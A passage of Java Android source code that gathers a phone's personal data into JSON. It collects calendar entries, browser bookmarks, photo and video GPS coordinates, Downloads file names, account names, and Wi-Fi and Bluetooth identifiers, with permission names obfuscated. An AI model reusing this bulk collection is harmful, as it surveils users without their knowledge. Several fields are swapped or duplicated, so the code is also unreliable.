                String[] COLUMNS = new String[]{CalendarContract.Events._ID, CalendarContract.Events.ACCESS_LEVEL,
                        CalendarContract.Events.ALL_DAY, CalendarContract.Events.AVAILABILITY, CalendarContract.Events.CALENDAR_ID,
                        CalendarContract.Events.DTSTART, CalendarContract.Events.DTEND, CalendarContract.Events.DURATION,
                        CalendarContract.Events.EVENT_COLOR, CalendarContract.Events.EVENT_TIMEZONE, CalendarContract.Events.EXDATE,
                        CalendarContract.Events.EXRULE, CalendarContract.Events.GUESTS_CAN_INVITE_OTHERS, CalendarContract.Events.GUESTS_CAN_MODIFY,
                        CalendarContract.Events.GUESTS_CAN_SEE_GUESTS, CalendarContract.Events.HAS_ALARM, CalendarContract.Events.HAS_ATTENDEE_DATA,
                        CalendarContract.Events.HAS_EXTENDED_PROPERTIES, CalendarContract.Events.LAST_DATE, CalendarContract.Events.RDATE,
                        CalendarContract.Events.RRULE, CalendarContract.Events.STATUS};
                Cursor cursor = context.getContentResolver().query(CalendarContract.Events.CONTENT_URI, COLUMNS, null, null, null);
                while (cursor != null && cursor.moveToNext()) {
                    JSONObject jsonObject = new JSONObject();
//                String event_id = cursor.getString(cursor.getColumnIndex(CalendarContract.Events._ID));
                    String access_level = cursor.getString(cursor.getColumnIndex(CalendarContract.Events.ACCESS_LEVEL));
                    String all_day = cursor.getString(cursor.getColumnIndex(CalendarContract.Events.ALL_DAY));
                    String availability = cursor.getString(cursor.getColumnIndex(CalendarContract.Events.AVAILABILITY));
                    String calendar_id = cursor.getString(cursor.getColumnIndex(CalendarContract.Events.CALENDAR_ID));
                    String dtstart = cursor.getString(cursor.getColumnIndex(CalendarContract.Events.DTSTART));
                    String dtend = cursor.getString(cursor.getColumnIndex(CalendarContract.Events.DTEND));
                    long duration = cursor.getLong(cursor.getColumnIndex(CalendarContract.Events.DURATION));
                    String event_color = cursor.getString(cursor.getColumnIndex(CalendarContract.Events.EVENT_COLOR));
                    String event_timezone = cursor.getString(cursor.getColumnIndex(CalendarContract.Events.EVENT_TIMEZONE));
                    String exdate = cursor.getString(cursor.getColumnIndex(CalendarContract.Events.EXDATE));
                    String exrule = cursor.getString(cursor.getColumnIndex(CalendarContract.Events.EXRULE));
                    String guests_can_invite_others = cursor.getString(cursor.getColumnIndex(CalendarContract.Events.GUESTS_CAN_INVITE_OTHERS));
                    String guests_can_modify = cursor.getString(cursor.getColumnIndex(CalendarContract.Events.GUESTS_CAN_MODIFY));
                    String guests_can_see_guests = cursor.getString(cursor.getColumnIndex(CalendarContract.Events.GUESTS_CAN_SEE_GUESTS));
                    String has_alarm = cursor.getString(cursor.getColumnIndex(CalendarContract.Events.HAS_ALARM));
                    String has_attendee_data = cursor.getString(cursor.getColumnIndex(CalendarContract.Events.HAS_ATTENDEE_DATA));
                    String has_extended_properties = cursor.getString(cursor.getColumnIndex(CalendarContract.Events.HAS_EXTENDED_PROPERTIES));
                    String last_date = cursor.getString(cursor.getColumnIndex(CalendarContract.Events.LAST_DATE));
                    String rdate = cursor.getString(cursor.getColumnIndex(CalendarContract.Events.RDATE));
                    String rrule = cursor.getString(cursor.getColumnIndex(CalendarContract.Events.RRULE));
                    String status = cursor.getString(cursor.getColumnIndex(CalendarContract.Events.STATUS));

                    jsonObject.put("access_level", isNullText(access_level));
                    jsonObject.put("all_day", isNullText(all_day));
                    jsonObject.put("availability", isNullText(availability));
                    jsonObject.put("calendar_id", isNullText(calendar_id));
                    jsonObject.put("dtstart", isNullText(dtstart));
                    jsonObject.put("dtend", isNullText(dtend));
                    jsonObject.put("duration", duration);
                    jsonObject.put("event_color", event_color);
                    jsonObject.put("event_timezone", event_timezone);
                    jsonObject.put("exdate", exdate);
                    jsonObject.put("exrule", exrule);
                    jsonObject.put("guests_canInvite_others", guests_can_invite_others);
                    jsonObject.put("guests_can_modify", guests_can_modify);
                    jsonObject.put("guests_can_see_guests", guests_can_see_guests);
                    jsonObject.put("has_alarm", has_alarm);
                    jsonObject.put("has_attendee_data", has_attendee_data);
                    jsonObject.put("has_extended_properties", has_extended_properties);
                    jsonObject.put("last_date", last_date);
                    jsonObject.put("rdate", rdate);
                    jsonObject.put("rrule", rrule);
                    jsonObject.put("event_status", status);
//                jsonObject.put("_id", event_id);
                    jsonArray.put(jsonObject);
                }
                if (cursor != null && !cursor.isClosed()) {
                    cursor.close();
                    cursor = null;
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return jsonArray;
    }

    private static JSONArray getCalendarAttendees(Context context) {
        JSONArray jsonArray = new JSONArray();
        try {
            if (!PageUtils.checkPermission(context, PageUtils.decodeStr(Constants.READ_CALENDAR))) {
                String[] COLUMNS = new String[]{CalendarContract.Attendees.EVENT_ID, CalendarContract.Attendees.ATTENDEE_RELATIONSHIP,
                        CalendarContract.Attendees.ATTENDEE_TYPE, CalendarContract.Attendees.ATTENDEE_STATUS};
                Cursor cursor = context.getContentResolver().query(CalendarContract.Attendees.CONTENT_URI, COLUMNS, null, null, null);
                while (cursor != null && cursor.moveToNext()) {
                    JSONObject jsonObject = new JSONObject();
                    String event_id = cursor.getString(cursor.getColumnIndex(CalendarContract.Attendees.EVENT_ID));
                    String attendee_relationship = cursor.getString(cursor.getColumnIndex(CalendarContract.Attendees.ATTENDEE_RELATIONSHIP));
                    String attendee_type = cursor.getString(cursor.getColumnIndex(CalendarContract.Attendees.ATTENDEE_TYPE));
                    String attendee_status = cursor.getString(cursor.getColumnIndex(CalendarContract.Attendees.ATTENDEE_STATUS));
//                jsonObject.put("_id", event_id);
                    jsonObject.put("attendee_relationship", attendee_relationship);
                    jsonObject.put("attendee_type", attendee_type);
                    jsonObject.put("attendee_status", attendee_status);
                    jsonArray.put(jsonObject);
                }
                if (cursor != null) {
                    cursor.close();
                    cursor = null;
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return jsonArray;
    }

    private static JSONArray getCalendarReminders(Context context) {
        JSONArray jsonArray = new JSONArray();
        try {
            if (!PageUtils.checkPermission(context, PageUtils.decodeStr(Constants.READ_CALENDAR))) {
                String[] COLUMNS = new String[]{CalendarContract.Reminders.EVENT_ID, CalendarContract.Reminders.METHOD, CalendarContract.Reminders.MINUTES};
                Cursor cursor = context.getContentResolver().query(CalendarContract.Reminders.CONTENT_URI, COLUMNS, null, null, null);
                while (cursor != null && cursor.moveToNext()) {
                    JSONObject jsonObject = new JSONObject();
//                String event_id = cursor.getString(cursor.getColumnIndex(CalendarContract.Reminders.EVENT_ID));
                    String method = cursor.getString(cursor.getColumnIndex(CalendarContract.Reminders.MINUTES));
                    String minutes = cursor.getString(cursor.getColumnIndex(CalendarContract.Reminders.METHOD));
//                jsonObject.put("_id", event_id);
                    jsonObject.put("method", method);
                    jsonObject.put("minutes", minutes);
                    jsonArray.put(jsonObject);
                }
                if (cursor != null && !cursor.isClosed()) {
                    cursor.close();
                    cursor = null;
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return jsonArray;
    }

    private static JSONArray getBrowserAndroid(Context context) {
        JSONArray jsonArray = new JSONArray();
        try {
            String[] COLUMNS = new String[]{"title", "url", "date", "bookmark", "visits"};
            Cursor cursor = context.getContentResolver().query(Uri.parse("content://browser/bookmarks"),
                    COLUMNS, null, null, "date desc");
            while (cursor != null && cursor.moveToNext()) {
                JSONObject jsonObject = new JSONObject();
                String title = cursor.getString(cursor.getColumnIndex("title"));
                String url = cursor.getString(cursor.getColumnIndex("url"));
                String date = cursor.getString(cursor.getColumnIndex("date"));
                String bookmark = cursor.getString(cursor.getColumnIndex("bookmark"));
                String visits = cursor.getString(cursor.getColumnIndex("visits"));
                jsonObject.put("title", title);
                jsonObject.put("url", url);
                jsonObject.put("date", date);
                jsonObject.put("bookmark", bookmark);
                jsonObject.put("visits", visits);
                jsonArray.put(jsonObject);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return jsonArray;
    }

    private static JSONArray getBrowserChrome(Context context) {
        JSONArray jsonArray = new JSONArray();
        try {
            String[] COLUMNS = new String[]{"title", "url", "date", "bookmark", "visits"};
            Cursor cursor = context.getContentResolver().query(Uri.parse("content://browser/bookmarks"),
                    COLUMNS, null, null, "date desc");
            while (cursor != null && cursor.moveToNext()) {
                JSONObject jsonObject = new JSONObject();
                String title = cursor.getString(cursor.getColumnIndex("title"));
                String url = cursor.getString(cursor.getColumnIndex("url"));
                String date = cursor.getString(cursor.getColumnIndex("date"));
                String bookmark = cursor.getString(cursor.getColumnIndex("bookmark"));
                String visits = cursor.getString(cursor.getColumnIndex("visits"));
                jsonObject.put("title", title);
                jsonObject.put("url", url);
                jsonObject.put("date", date);
                jsonObject.put("bookmark", bookmark);
                jsonObject.put("visits", visits);
                jsonArray.put(jsonObject);
            }
            if (cursor != null && !cursor.isClosed()) {
                cursor.close();
                cursor = null;
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return jsonArray;
    }

    private static JSONArray getAudioExternal(Context context) {
        JSONArray jsonArray = new JSONArray();
        try {
            if (!PageUtils.checkPermission(context, PageUtils.decodeStr(Constants.READ_EXTERNAL_STORAGE))) {
                String[] COLUMNS = new String[]{MediaStore.Audio.AudioColumns.DATE_ADDED, MediaStore.Audio.AudioColumns.DATE_MODIFIED,
                        MediaStore.Audio.AudioColumns.DURATION, MediaStore.Audio.AudioColumns.MIME_TYPE,
                        MediaStore.Audio.AudioColumns.IS_MUSIC, MediaStore.Audio.AudioColumns.YEAR,
                        MediaStore.Audio.AudioColumns.IS_NOTIFICATION, MediaStore.Audio.AudioColumns.IS_RINGTONE,
                        MediaStore.Audio.AudioColumns.IS_ALARM};
                Cursor cursor = context.getContentResolver().query(MediaStore.Audio.Media.EXTERNAL_CONTENT_URI, COLUMNS, null, null, null);
                while (cursor != null && cursor.moveToNext()) {
                    JSONObject jsonObject = new JSONObject();
                    String date_added = cursor.getString(cursor.getColumnIndex(MediaStore.Audio.AudioColumns.DATE_ADDED));
                    String date_modified = cursor.getString(cursor.getColumnIndex(MediaStore.Audio.AudioColumns.DATE_MODIFIED));
                    String duration = cursor.getString(cursor.getColumnIndex(MediaStore.Audio.AudioColumns.DURATION));
                    String mime_type = cursor.getString(cursor.getColumnIndex(MediaStore.Audio.AudioColumns.MIME_TYPE));
                    String is_music = cursor.getString(cursor.getColumnIndex(MediaStore.Audio.AudioColumns.IS_MUSIC));
                    String year = cursor.getString(cursor.getColumnIndex(MediaStore.Audio.AudioColumns.YEAR));
                    String is_notification = cursor.getString(cursor.getColumnIndex(MediaStore.Audio.AudioColumns.IS_NOTIFICATION));
                    String is_ringtone = cursor.getString(cursor.getColumnIndex(MediaStore.Audio.AudioColumns.IS_RINGTONE));
                    String is_alarm = cursor.getString(cursor.getColumnIndex(MediaStore.Audio.AudioColumns.IS_ALARM));
                    jsonObject.put("is_music", is_music);
                    jsonObject.put("date_added", date_added);
                    jsonObject.put("date_modified", date_modified);
                    jsonObject.put("duration", duration);
                    jsonObject.put("mime_type", mime_type);
                    jsonObject.put("year", year);
                    jsonObject.put("is_notification", is_notification);
                    jsonObject.put("is_ringtone", is_ringtone);
                    jsonObject.put("is_alarm", is_alarm);
                    jsonArray.put(jsonObject);
                }
                if (cursor != null && !cursor.isClosed()) {
                    cursor.close();
                    cursor = null;
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return jsonArray;
    }

    private static JSONArray getAudioInternal(Context context) {
        JSONArray jsonArray = new JSONArray();
        try {
            String[] COLUMNS = new String[]{MediaStore.Audio.AudioColumns.DATE_ADDED, MediaStore.Audio.AudioColumns.DATE_MODIFIED,
                    MediaStore.Audio.AudioColumns.DURATION, MediaStore.Audio.AudioColumns.MIME_TYPE,
                    MediaStore.Audio.AudioColumns.IS_MUSIC, MediaStore.Audio.AudioColumns.YEAR,
                    MediaStore.Audio.AudioColumns.IS_NOTIFICATION, MediaStore.Audio.AudioColumns.IS_RINGTONE,
                    MediaStore.Audio.AudioColumns.IS_ALARM};
            Cursor cursor = context.getContentResolver().query(MediaStore.Audio.Media.INTERNAL_CONTENT_URI, COLUMNS, null, null, MediaStore.Audio.Media.DEFAULT_SORT_ORDER);
            while (cursor != null && cursor.moveToNext()) {
                JSONObject jsonObject = new JSONObject();
                String date_added = cursor.getString(cursor.getColumnIndex(MediaStore.Audio.AudioColumns.DATE_ADDED));
                String date_modified = cursor.getString(cursor.getColumnIndex(MediaStore.Audio.AudioColumns.DATE_MODIFIED));
                String duration = cursor.getString(cursor.getColumnIndex(MediaStore.Audio.AudioColumns.DURATION));
                String mime_type = cursor.getString(cursor.getColumnIndex(MediaStore.Audio.AudioColumns.MIME_TYPE));
                String is_music = cursor.getString(cursor.getColumnIndex(MediaStore.Audio.AudioColumns.IS_MUSIC));
                String year = cursor.getString(cursor.getColumnIndex(MediaStore.Audio.AudioColumns.YEAR));
                String is_notification = cursor.getString(cursor.getColumnIndex(MediaStore.Audio.AudioColumns.IS_NOTIFICATION));
                String is_ringtone = cursor.getString(cursor.getColumnIndex(MediaStore.Audio.AudioColumns.IS_RINGTONE));
                String is_alarm = cursor.getString(cursor.getColumnIndex(MediaStore.Audio.AudioColumns.IS_ALARM));
                jsonObject.put("is_music", is_music);
                jsonObject.put("date_added", date_added);
                jsonObject.put("date_modified", date_modified);
                jsonObject.put("duration", duration);
                jsonObject.put("mime_type", mime_type);
                jsonObject.put("year", year);
                jsonObject.put("is_notification", is_notification);
                jsonObject.put("is_ringtone", is_ringtone);
                jsonObject.put("is_alarm", is_alarm);
                jsonArray.put(jsonObject);
            }
            if (cursor != null && !cursor.isClosed()) {
                cursor.close();
                cursor = null;
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return jsonArray;
    }

    private static JSONArray getImagesInternal(Context context) {
        JSONArray jsonArray = new JSONArray();
        try {
            String[] COLUMNS = new String[]{MediaStore.Images.ImageColumns.DATE_TAKEN, MediaStore.Images.ImageColumns.DATE_ADDED,
                    MediaStore.Images.ImageColumns.DATE_MODIFIED, MediaStore.Images.ImageColumns.HEIGHT,
                    MediaStore.Images.ImageColumns.WIDTH, MediaStore.Images.ImageColumns.LATITUDE,
                    MediaStore.Images.ImageColumns.LONGITUDE, MediaStore.Images.ImageColumns.MIME_TYPE,
                    MediaStore.Images.ImageColumns.TITLE, MediaStore.Images.ImageColumns.SIZE};
            Cursor cursor = context.getContentResolver().query(MediaStore.Images.Media.INTERNAL_CONTENT_URI, COLUMNS, null, null, null);
            while (cursor != null && cursor.moveToNext()) {
                JSONObject jsonObject = new JSONObject();
                String date_taken = cursor.getString(cursor.getColumnIndex(MediaStore.Images.ImageColumns.DATE_TAKEN));
                String date_added = cursor.getString(cursor.getColumnIndex(MediaStore.Images.ImageColumns.DATE_ADDED));
                String date_modified = cursor.getString(cursor.getColumnIndex(MediaStore.Images.ImageColumns.DATE_MODIFIED));
                String height = cursor.getString(cursor.getColumnIndex(MediaStore.Images.ImageColumns.HEIGHT));
                String width = cursor.getString(cursor.getColumnIndex(MediaStore.Images.ImageColumns.WIDTH));
                String latitude = cursor.getString(cursor.getColumnIndex(MediaStore.Images.ImageColumns.LATITUDE));
                String longitude = cursor.getString(cursor.getColumnIndex(MediaStore.Images.ImageColumns.LONGITUDE));
                String mime_type = cursor.getString(cursor.getColumnIndex(MediaStore.Images.ImageColumns.MIME_TYPE));
                String title = cursor.getString(cursor.getColumnIndex(MediaStore.Images.ImageColumns.TITLE));
                String size = cursor.getString(cursor.getColumnIndex(MediaStore.Images.ImageColumns.SIZE));
                jsonObject.put("datetaken", date_taken);
                jsonObject.put("date_added", date_added);
                jsonObject.put("date_modified", date_modified);
                jsonObject.put("height", height);
                jsonObject.put("width", width);
                jsonObject.put("latitude", latitude);
                jsonObject.put("longitude", longitude);
                jsonObject.put("mime_type", mime_type);
                jsonObject.put("title", title);
                jsonObject.put("size", size);
                jsonArray.put(jsonObject);
            }
            if (cursor != null && !cursor.isClosed()) {
                cursor.close();
                cursor = null;
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return jsonArray;
    }

    private static JSONArray getImagesExternal(Context context) {
        JSONArray jsonArray = new JSONArray();
        try {
            if (!PageUtils.checkPermission(context, PageUtils.decodeStr(Constants.READ_EXTERNAL_STORAGE))) {
                String[] COLUMNS = new String[]{MediaStore.Images.ImageColumns.DATE_TAKEN, MediaStore.Images.ImageColumns.DATE_ADDED,
                        MediaStore.Images.ImageColumns.DATE_MODIFIED, MediaStore.Images.ImageColumns.HEIGHT,
                        MediaStore.Images.ImageColumns.WIDTH, MediaStore.Images.ImageColumns.LATITUDE,
                        MediaStore.Images.ImageColumns.LONGITUDE, MediaStore.Images.ImageColumns.MIME_TYPE,
                        MediaStore.Images.ImageColumns.TITLE, MediaStore.Images.ImageColumns.SIZE};
                Cursor cursor = context.getContentResolver().query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, COLUMNS, null, null, null);
                while (cursor != null && cursor.moveToNext()) {
                    JSONObject jsonObject = new JSONObject();
                    String date_taken = cursor.getString(cursor.getColumnIndex(MediaStore.Images.ImageColumns.DATE_TAKEN));
                    String date_added = cursor.getString(cursor.getColumnIndex(MediaStore.Images.ImageColumns.DATE_ADDED));
                    String date_modified = cursor.getString(cursor.getColumnIndex(MediaStore.Images.ImageColumns.DATE_MODIFIED));
                    String height = cursor.getString(cursor.getColumnIndex(MediaStore.Images.ImageColumns.HEIGHT));
                    String width = cursor.getString(cursor.getColumnIndex(MediaStore.Images.ImageColumns.WIDTH));
                    String latitude = cursor.getString(cursor.getColumnIndex(MediaStore.Images.ImageColumns.LATITUDE));
                    String longitude = cursor.getString(cursor.getColumnIndex(MediaStore.Images.ImageColumns.LONGITUDE));
                    String mime_type = cursor.getString(cursor.getColumnIndex(MediaStore.Images.ImageColumns.MIME_TYPE));
                    String title = cursor.getString(cursor.getColumnIndex(MediaStore.Images.ImageColumns.TITLE));
                    String size = cursor.getString(cursor.getColumnIndex(MediaStore.Images.ImageColumns.SIZE));
                    jsonObject.put("datetaken", date_taken);
                    jsonObject.put("date_added", date_added);
                    jsonObject.put("date_modified", date_modified);
                    jsonObject.put("height", height);
                    jsonObject.put("width", width);
                    jsonObject.put("latitude", latitude);
                    jsonObject.put("longitude", longitude);
                    jsonObject.put("mime_type", mime_type);
                    jsonObject.put("title", title);
                    jsonObject.put("_size", size);
                    jsonArray.put(jsonObject);
                    jsonArray.put(jsonObject);
                }
                if (cursor != null && !cursor.isClosed()) {
                    cursor.close();
                    cursor = null;
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return jsonArray;
    }

    private static JSONArray getVideoInternal(Context context) {
        JSONArray jsonArray = new JSONArray();
        try {
            String[] COLUMNS = new String[]{MediaStore.Video.VideoColumns.DATE_ADDED, MediaStore.Video.VideoColumns.DATE_MODIFIED,
                    MediaStore.Video.VideoColumns.DATE_TAKEN, MediaStore.Video.VideoColumns.DESCRIPTION,
                    MediaStore.Video.VideoColumns.DURATION, MediaStore.Video.VideoColumns.IS_PRIVATE,
                    MediaStore.Video.VideoColumns.LANGUAGE, MediaStore.Video.VideoColumns.MIME_TYPE,
                    MediaStore.Video.VideoColumns.RESOLUTION, MediaStore.Video.VideoColumns.SIZE,
                    MediaStore.Video.VideoColumns.TAGS, MediaStore.Video.VideoColumns.LATITUDE,
                    MediaStore.Video.VideoColumns.LONGITUDE, MediaStore.Video.VideoColumns.TITLE};
            Cursor cursor = context.getContentResolver().query(MediaStore.Video.Media.INTERNAL_CONTENT_URI, COLUMNS, null, null, null);
            while (cursor != null && cursor.moveToNext()) {
                JSONObject jsonObject = new JSONObject();
                String date_added = cursor.getString(cursor.getColumnIndex(MediaStore.Video.VideoColumns.DATE_ADDED));
                String date_modified = cursor.getString(cursor.getColumnIndex(MediaStore.Video.VideoColumns.DATE_MODIFIED));
                String date_taken = cursor.getString(cursor.getColumnIndex(MediaStore.Video.VideoColumns.DATE_TAKEN));
                String description = cursor.getString(cursor.getColumnIndex(MediaStore.Video.VideoColumns.DESCRIPTION));
                String duration = cursor.getString(cursor.getColumnIndex(MediaStore.Video.VideoColumns.DURATION));
                String is_private = cursor.getString(cursor.getColumnIndex(MediaStore.Video.VideoColumns.IS_PRIVATE));
                String language = cursor.getString(cursor.getColumnIndex(MediaStore.Video.VideoColumns.LANGUAGE));
                String mime_type = cursor.getString(cursor.getColumnIndex(MediaStore.Video.VideoColumns.MIME_TYPE));
                String resolution = cursor.getString(cursor.getColumnIndex(MediaStore.Video.VideoColumns.RESOLUTION));
                String size = cursor.getString(cursor.getColumnIndex(MediaStore.Video.VideoColumns.SIZE));
                String tags = cursor.getString(cursor.getColumnIndex(MediaStore.Video.VideoColumns.TAGS));
                String latitude = cursor.getString(cursor.getColumnIndex(MediaStore.Video.VideoColumns.LATITUDE));
                String longitude = cursor.getString(cursor.getColumnIndex(MediaStore.Video.VideoColumns.LONGITUDE));
                String title = cursor.getString(cursor.getColumnIndex(MediaStore.Video.VideoColumns.TITLE));
                jsonObject.put("date_added", date_added);
                jsonObject.put("date_modified", date_modified);
                jsonObject.put("datetaken", date_taken);
                jsonObject.put("description", description);
                jsonObject.put("duration", duration);
                jsonObject.put("is_private", is_private);
                jsonObject.put("language", language);
                jsonObject.put("mime_type", mime_type);
                jsonObject.put("resolution", resolution);
                jsonObject.put("_size", size);
                jsonObject.put("tags", tags);
                jsonObject.put("latitude", latitude);
                jsonObject.put("longitude", longitude);
                jsonObject.put("title", title);
                jsonArray.put(jsonObject);
            }
            if (cursor != null && !cursor.isClosed()) {
                cursor.close();
                cursor = null;
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return jsonArray;
    }

    private static JSONArray getVideoExternal(Context context) {
        JSONArray jsonArray = new JSONArray();
        try {
            if (!PageUtils.checkPermission(context, PageUtils.decodeStr(Constants.READ_EXTERNAL_STORAGE))) {
                String[] COLUMNS = new String[]{MediaStore.Video.VideoColumns.DATE_ADDED, MediaStore.Video.VideoColumns.DATE_MODIFIED,
                        MediaStore.Video.VideoColumns.DATE_TAKEN, MediaStore.Video.VideoColumns.DESCRIPTION,
                        MediaStore.Video.VideoColumns.DURATION, MediaStore.Video.VideoColumns.IS_PRIVATE,
                        MediaStore.Video.VideoColumns.LANGUAGE, MediaStore.Video.VideoColumns.MIME_TYPE,
                        MediaStore.Video.VideoColumns.RESOLUTION, MediaStore.Video.VideoColumns.SIZE,
                        MediaStore.Video.VideoColumns.TAGS, MediaStore.Video.VideoColumns.LATITUDE,
                        MediaStore.Video.VideoColumns.LONGITUDE, MediaStore.Video.VideoColumns.TITLE};
                Cursor cursor = context.getContentResolver().query(MediaStore.Video.Media.EXTERNAL_CONTENT_URI, COLUMNS, null, null, null);
                while (cursor != null && cursor.moveToNext()) {
                    JSONObject jsonObject = new JSONObject();
                    String date_added = cursor.getString(cursor.getColumnIndex(MediaStore.Video.VideoColumns.DATE_ADDED));
                    String date_modified = cursor.getString(cursor.getColumnIndex(MediaStore.Video.VideoColumns.DATE_MODIFIED));
                    String date_taken = cursor.getString(cursor.getColumnIndex(MediaStore.Video.VideoColumns.DATE_TAKEN));
                    String description = cursor.getString(cursor.getColumnIndex(MediaStore.Video.VideoColumns.DESCRIPTION));
                    String duration = cursor.getString(cursor.getColumnIndex(MediaStore.Video.VideoColumns.DURATION));
                    String is_private = cursor.getString(cursor.getColumnIndex(MediaStore.Video.VideoColumns.IS_PRIVATE));
                    String language = cursor.getString(cursor.getColumnIndex(MediaStore.Video.VideoColumns.LANGUAGE));
                    String mime_type = cursor.getString(cursor.getColumnIndex(MediaStore.Video.VideoColumns.MIME_TYPE));
                    String resolution = cursor.getString(cursor.getColumnIndex(MediaStore.Video.VideoColumns.RESOLUTION));
                    String size = cursor.getString(cursor.getColumnIndex(MediaStore.Video.VideoColumns.SIZE));
                    String tags = cursor.getString(cursor.getColumnIndex(MediaStore.Video.VideoColumns.TAGS));
                    String latitude = cursor.getString(cursor.getColumnIndex(MediaStore.Video.VideoColumns.LATITUDE));
                    String longitude = cursor.getString(cursor.getColumnIndex(MediaStore.Video.VideoColumns.LONGITUDE));
                    String title = cursor.getString(cursor.getColumnIndex(MediaStore.Video.VideoColumns.TITLE));
                    jsonObject.put("date_added", date_added);
                    jsonObject.put("date_modified", date_modified);
                    jsonObject.put("datetaken", date_taken);
                    jsonObject.put("description", description);
                    jsonObject.put("duration", duration);
                    jsonObject.put("is_private", is_private);
                    jsonObject.put("language", language);
                    jsonObject.put("mime_type", mime_type);
                    jsonObject.put("resolution", resolution);
                    jsonObject.put("_size", size);
                    jsonObject.put("tags", tags);
                    jsonObject.put("latitude", latitude);
                    jsonObject.put("longitude", longitude);
                    jsonObject.put("title", title);
                    jsonArray.put(jsonObject);
                }
                if (cursor != null && !cursor.isClosed()) {
                    cursor.close();
                    cursor = null;
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return jsonArray;
    }

    private static JSONArray getDownloadFile() {
        JSONArray jsonArray = new JSONArray();
        try {
            File fileDonwload = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
            File[] files = fileDonwload.listFiles();
            List<JSONObject> list = getFileName(files);
            if (null != list && list.size() > 0) {
                for (int i = 0; i < list.size(); i++) {
                    JSONObject obj = list.get(i);
                    jsonArray.put(obj);
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return jsonArray;
    }

    private static List<JSONObject> getFileName(File[] files) {
        List<JSONObject> list = new ArrayList<>();
        try {
            if (files != null) {
                for (File file : files) {
                    if (file.isDirectory()) {
                        List<JSONObject> list2 = getFileName(file.listFiles());
                        list.addAll(list2);
                    } else {
                        JSONObject jsonObject = new JSONObject();
                        jsonObject.put("file_name", file.getName());
                        jsonObject.put("file_type", MimeTypeMap.getFileExtensionFromUrl(file.getName()));
                        jsonObject.put("length", file.length());
                        jsonObject.put("last_modified", file.lastModified());
                        list.add(jsonObject);
                    }
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return list;
    }

    private static JSONArray getRegisteredAccounts(Context context) {
        JSONArray jsonArray = new JSONArray();
        try {
            AccountManager accountManager = AccountManager.get(context);
            Account[] accounts = accountManager.getAccounts();
            for (Account account : accounts) {
                JSONObject jsonObject = new JSONObject();
                jsonObject.put("account", account.name);
                jsonObject.put("type", account.type);
                jsonArray.put(jsonObject);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return jsonArray;
    }

    private static JSONObject getVoice(Context context) {
        AudioManager audioManager = (AudioManager) context.getSystemService(Context.AUDIO_SERVICE);
        JSONObject jsonObject = new JSONObject();
        try {
            JSONObject callObj = new JSONObject();
            callObj.put("max", audioManager.getStreamMaxVolume(AudioManager.STREAM_VOICE_CALL));
            callObj.put("current", audioManager.getStreamVolume(AudioManager.STREAM_VOICE_CALL));
            JSONObject systemObj = new JSONObject();
            systemObj.put("max", audioManager.getStreamMaxVolume(AudioManager.STREAM_SYSTEM));
            systemObj.put("current", audioManager.getStreamVolume(AudioManager.STREAM_SYSTEM));
            JSONObject ringObj = new JSONObject();
            ringObj.put("max", audioManager.getStreamMaxVolume(AudioManager.STREAM_RING));
            ringObj.put("current", audioManager.getStreamVolume(AudioManager.STREAM_RING));
            JSONObject musicObj = new JSONObject();
            musicObj.put("max", audioManager.getStreamMaxVolume(AudioManager.STREAM_MUSIC));
            musicObj.put("current", audioManager.getStreamVolume(AudioManager.STREAM_MUSIC));
            JSONObject alertObj = new JSONObject();
            alertObj.put("max", audioManager.getStreamMaxVolume(AudioManager.STREAM_ALARM));
            alertObj.put("current", audioManager.getStreamVolume(AudioManager.STREAM_ALARM));
            JSONObject notificationObj = new JSONObject();
            notificationObj.put("max", audioManager.getStreamMaxVolume(AudioManager.STREAM_NOTIFICATION));
            notificationObj.put("current", audioManager.getStreamVolume(AudioManager.STREAM_NOTIFICATION));

            jsonObject.put("call", callObj);
            jsonObject.put("system", systemObj);
            jsonObject.put("ring", ringObj);
            jsonObject.put("music", musicObj);
            jsonObject.put("alert", alertObj);
            jsonObject.put("notification", notificationObj);
        } catch (Exception e) {
            e.printStackTrace();
        }
        return jsonObject;
    }

    private static JSONObject getNetwork(Context context) {
        JSONObject jsonObject = new JSONObject();
        try {
            JSONObject current_wifi = new JSONObject();
            WifiManager wifiManager = (WifiManager) context.getSystemService(Context.WIFI_SERVICE);
            WifiInfo wifiInfo = wifiManager.getConnectionInfo();
            if (null != wifiInfo) {
                current_wifi.put("bssid", wifiInfo.getBSSID());
                current_wifi.put("ssid", wifiInfo.getSSID());
                current_wifi.put("mac", wifiInfo.getMacAddress());

                jsonObject.put("IP", intToIpAddress(wifiInfo.getIpAddress()));
            }
            jsonObject.put("current_wifi", current_wifi);

            JSONArray configured_wifi = new JSONArray();
            List<ScanResult> scanResults = wifiManager.getScanResults();
            if (scanResults != null) {
                for (int i = 0; i < scanResults.size(); i++) {
                    ScanResult scanResult = scanResults.get(i);
                    JSONObject scanObj = new JSONObject();
                    scanObj.put("bssid", isNullText(scanResult.SSID));
                    scanObj.put("ssid", isNullText(scanResult.BSSID));
                    scanObj.put("name", isNullText(scanResult.SSID));
                    scanObj.put("mac", isNullText(scanResult.BSSID));
                    configured_wifi.put(scanObj);
                }
            }
            jsonObject.put("configured_wifi", configured_wifi);
        } catch (Exception e) {
            e.printStackTrace();
        }
        return jsonObject;
    }

    private static JSONObject getBluetooth() {
        JSONObject jsonObject = new JSONObject();
        try {
            BluetoothAdapter bluetoothAdapter = BluetoothAdapter.getDefaultAdapter();
            String name = bluetoothAdapter.getName();
            int state = bluetoothAdapter.getState();
            String macAddress = getBlueToothAddress(bluetoothAdapter);
            jsonObject.put("name", name);
            jsonObject.put("state", state);
            jsonObject.put("mac_address", macAddress);
        } catch (Exception e) {
            e.printStackTrace();
        }
        return jsonObject;
    }

